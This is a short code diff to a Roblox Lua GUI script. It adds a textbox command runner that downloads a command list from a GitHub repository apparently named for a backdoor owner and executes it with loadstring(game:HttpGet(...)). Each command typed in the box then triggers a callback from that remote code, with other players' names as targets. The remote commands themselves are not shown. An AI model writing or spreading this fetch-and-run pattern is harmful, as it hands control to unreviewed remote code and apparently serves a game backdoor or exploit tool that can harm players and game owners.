@@ -52,7 +52,32 @@ task.spawn(C_3)
 
 local function C_4()
 	local script = LMG2L["Cmds_4"]
-  local cmdslist = ""
+	local player = game.Players.LocalPlayer
+local tb = player.PlayerGui:WaitForChild("ScreenGui_1"):WaitForChild("cmd_2")
+local cmds = loadstring(game:HttpGet("https://raw.githubusercontent.com/TheTombstoneBackdoorOwner/mango-cmd/refs/heads/main/cmdlist.lua"))()
+
+local function run()
+    local txt = tb.Text
+    if txt == "" then return end
+    local parts = string.split(txt, " ")
+    local name, args = parts[1]:lower(), {select(2, table.unpack(parts))}
+    for _, cmd in pairs(cmds) do
+        if cmd.Name:lower() == name then
+            for i,v in pairs(args) do
+                if v == "playername" then
+                    args[i] = parts[2]
+                end
+            end
+            pcall(function() cmd.CallBack(player, args) end)
+            break
+        end
+    end
+    tb.Text = ""
+end
+
+tb.FocusLost:Connect(function(enter)
+    if enter then run() end
+end)
 end
 task.spawn(C_4)
 
